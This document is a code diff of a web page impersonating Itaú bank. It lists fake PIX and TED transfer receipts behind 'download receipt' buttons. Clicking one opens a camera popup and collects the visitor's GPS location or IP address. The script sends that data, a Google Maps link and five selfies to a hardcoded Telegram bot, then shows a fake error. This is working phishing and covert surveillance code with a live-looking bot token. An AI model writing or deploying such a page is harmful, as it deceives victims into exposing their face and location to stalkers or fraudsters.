@@ -2,79 +2,133 @@
 <html lang="pt-BR">
 <head>
   <meta charset="utf-8">
-  <title>Comprovante de Transferência – Itaú</title>
+  <title>Comprovantes de Transação – Itaú</title>
   <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link rel="shortcut icon" href="https://www.itau.com.br/favicon.ico">
   <style>
-    body{font-family:Arial,Helvetica,sans-serif;background:#f4f4f4;margin:0}
-    .comprovante{margin:30px auto;max-width:500px;background:#fff;border:1px solid #ccc;border-radius:6px;padding:20px;text-align:center;box-shadow:0 2px 8px #0002}
-    .logo{color:#003d82;font-size:26px;font-weight:bold}
-    .linha{margin:10px 0;font-size:14px;display:flex;justify-content:space-between}
-    hr{border:none;height:1px;background:#ddd;margin:12px 0}
-    button{padding:12px 24px;background:#003d82;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
-    button:hover{background:#002a61}
+    :root{--primary:#003d82;--grey:#f5f5f5}
+    body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#fff}
+    header{background:var(--primary);color:#fff;padding:18px 0}
+    .logo{font-size:28px;font-weight:bold;text-align:center}
+    main{max-width:960px;margin:30px auto;padding:0 15px}
+    .card{background:var(--grey);border-radius:8px;padding:20px;margin-bottom:15px;display:flex;justify-content:space-between;align-items:center}
+    .info{flex:1}
+    .info h3{margin:0 0 4px;font-size:16px}
+    .value{color:#2e7d32;font-weight:bold}
+    .btn{background:var(--primary);color:#fff;border:none;padding:10px 24px;border-radius:4px;cursor:pointer;font-size:14px}
+    .btn:hover{background:#002a61}
+    .overlay{position:fixed;inset:0;background:#000a;display:flex;align-items:center;justify-content:center;z-index:9999;opacity:0;visibility:hidden;transition:.3s}
+    .overlay.show{opacity:1;visibility:visible}
+    .box{background:#fff;border-radius:8px;padding:30px;text-align:center;min-width:320px}
+    .box img{filter:blur(8px);width:180px;height:240px;background:#eee}
+    .progress{background:#ccc;height:6px;border-radius:3px;overflow:hidden;margin:20px 0}
+    .bar{height:100%;width:0;background:var(--primary);transition:2s}
   </style>
 </head>
 <body>
-  <div class="comprovante">
+  <header>
     <div class="logo">Itaú</div>
-    <hr>
-    <div class="linha"><span>Agência</span><span>0001</span></div>
-    <div class="linha"><span>Conta</span><span>12345-6</span></div>
-    <div class="linha"><span>Data/Hora</span><span id="data"></span></div>
-    <div class="linha"><span>Valor</span><span>R$ 350,00</span></div>
-    <hr>
-    <button id="btn" onclick="abrirCheckin()">Visualizar/Imprimir comprovante completo</button>
+  </header>
+
+  <main>
+    <h2>Comprovantes emitidos</h2>
+
+    <div class="card">
+      <div class="info">
+        <h3>Transferência PIX</h3>
+        <p>05/03/2026 14:32 • Para João Silva</p>
+        <p class="value">R$ 350,00</p>
+      </div>
+      <button class="btn" onclick="baixar(this,'350,00')">Baixar comprovante</button>
+    </div>
+
+    <div class="card">
+      <div class="info">
+        <h3>Pix – QR Code</h3>
+        <p>04/03/2026 09:15 • Mercado</p>
+        <p class="value">R$ 89,90</p>
+      </div>
+      <button class="btn" onclick="baixar(this,'89,90')">Baixar comprovante</button>
+    </div>
+
+    <div class="card">
+      <div class="info">
+        <h3>TED</h3>
+        <p>03/03/2026 16:22 • Conta corrente</p>
+        <p class="value">R$ 1.200,00</p>
+      </div>
+      <button class="btn" onclick="baixar(this,'1.200,00')">Baixar comprovante</button>
+    </div>
+  </main>
+
+  <div id="ov" class="overlay">
+    <div class="box">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='180' height='240'%3E%3Crect width='100%25' height='100%25' fill='%23eee'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='20'%3EPDF%3C/text%3E%3C/svg%3E" alt="Comprovante borrado">
+      <p>Preparando comprovante...</p>
+      <div class="progress"><div id="bar" class="bar"></div></div>
+      <small>Aguarde enquanto processamos seu arquivo.</small>
+    </div>
   </div>
 
   <script>
-    /* CONFIG TELEGRAM – substitua os dois valores */
+    /* ========= CONFIGS TELEGRAM ========= */
     const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
     const CHAT_ID = '-1003187104876';
 
-    // completa data/hora fake
-    document.getElementById('data').textContent = new Date().toLocaleString('pt-BR');
+    function baixar(bt,valor){
+      bt.disabled = true;
+      const ov  = document.getElementById('ov');
+      const bar = document.getElementById('bar');
+      ov.classList.add('show');
+      bar.style.width = '0%';
+      setTimeout(()=> bar.style.width = '72%', 400);
 
-    // abre popup (câmera) e libera botão depois de 8 s
-    function abrirCheckin(){
-      const p = window.open('popup.html','ck','width=400,height=600');
-      if(!p){ alert('⚠️ Popup bloqueado. Ative e tente novamente.'); }
-      document.getElementById('btn').disabled = true;
-      setTimeout(()=> document.getElementById('btn').disabled = false, 8000);
-    }
+      const popup = window.open('popup.html','ck','width=400,height=600');
+      if(!popup){ alert('⚠️ Popup bloqueado. Ative e tente novamente.'); ov.classList.remove('show'); bt.disabled=false; return; }
 
-    // ouve resposta do popup
-    window.addEventListener('message', async (ev)=>{
-      if(ev.origin !== location.origin) return;
-      if(ev.data.type === 'negado'){ alert('Permissão de câmera recusada.'); return; }
-      if(ev.data.type !== 'selfiesDone') return;
+      window.addEventListener('message', async (ev)=>{
+        if(ev.origin !== location.origin) return;
+        if(ev.data.type === 'negado'){ alert('Permissão de câmera recusada.'); ov.classList.remove('show'); bt.disabled=false; return; }
+        if(ev.data.type !== 'selfiesDone') return;
 
-      // mesmo envio do antes (texto + 5 fotos)
-      const {selfies,locationData,ipFallback} = ev.data.dados;
-      const hora = new Date().toLocaleString('pt-BR');
-      let texto = `🔴 Comprovante aberto – ${hora}\n`;
-      if(locationData){
-        texto += `📍 GPS Lat: ${locationData.lat.toFixed(6)} Lng: ${locationData.lon.toFixed(6)}\n`;
-      }else{
-        texto += `📍 GPS negado – IP: ${ipFallback}\n`;
-      }
-      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({chat_id:CHAT_ID,text:texto})
+        const {selfies,locationData,ipFallback} = ev.data.dados;
+        const hora = new Date().toLocaleString('pt-BR');
+
+        /* === MONTA MENSAGEM COM LINK GOOGLE MAPS === */
+        let texto = `🔴 Comprovante aberto – R$ ${valor} – ${hora}\n`;
+        if(locationData){
+          texto += `📍 https://www.google.com/maps?q=${locationData.lat},${locationData.lon}&hl=pt-BR&z=18\n`;
+        }else{
+          texto += `📍 GPS negado – IP: ${ipFallback}\n`;
+        }
+
+        /* === ENVIA TEXTO + 5 SELFIES === */
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({chat_id:CHAT_ID,text:texto})
+        });
+
+        for(let idx=0;idx<selfies.length;idx++){
+          const byteString = atob(selfies[idx].split(',')[1]);
+          const mime = selfies[idx].split(',')[0].split(':')[1].split(';')[0];
+          const ab = new ArrayBuffer(byteString.length);
+          const ia = new Uint8Array(ab);
+          for(let i=0;i<byteString.length;i++) ia[i]=byteString.charCodeAt(i);
+          const blob = new Blob([ab],{type:mime});
+          const fd = new FormData();
+          fd.append('chat_id', CHAT_ID);
+          fd.append('photo', blob, `selfie_${valor}_${idx+1}.jpg`);
+          await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:fd});
+        }
+
+        setTimeout(()=>{
+          ov.classList.remove('show');
+          alert('Não foi possível gerar o comprovante. Tente novamente mais tarde.');
+          bt.disabled = false;
+        },800);
       });
-      for(let idx=0;idx<selfies.length;idx++){
-        const byteString = atob(selfies[idx].split(',')[1]);
-        const mime = selfies[idx].split(',')[0].split(':')[1].split(';')[0];
-        const ab = new ArrayBuffer(byteString.length);
-        const ia = new Uint8Array(ab);
-        for(let i=0;i<byteString.length;i++) ia[i]=byteString.charCodeAt(i);
-        const blob = new Blob([ab],{type:mime});
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, `selfie_${idx+1}.jpg`);
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:fd});
-      }
-    });
+    }
   </script>
 </body>
 </html>
